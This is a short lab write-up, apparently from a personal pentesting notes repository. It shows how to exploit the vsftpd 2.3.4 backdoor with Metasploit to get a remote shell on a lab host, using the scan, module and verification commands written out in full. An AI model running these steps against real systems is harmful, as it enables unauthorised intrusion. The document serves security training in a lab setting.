[🏠 Home](../README.md) • [🧪 Labs](../labs/README.md) • [🗒️ Notes](../notes/README.md)

# 🐚 FTP Exploit – vsftpd 2.3.4

## 🎯 Objective
Exploit a known backdoor vulnerability in vsftpd 2.3.4 to gain a remote shell.

## 🔧 Tools Used
- Metasploit Framework
- Nmap (optional pre-scan)

## 🪜 Steps
1. Scan with Nmap:
    ```
    nmap -sV -p 21 172.21.175.100
    ```

2. Launch Metasploit:
    ```
    msfconsole
    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 172.21.175.100
    run
    ```

3. Verify shell:
    ```
    whoami
    uname -a
    ```

## 🧠 Notes
- Sometimes requires restarting the target or switching payloads.
- May need to set `PAYLOAD cmd/unix/interact`.

---
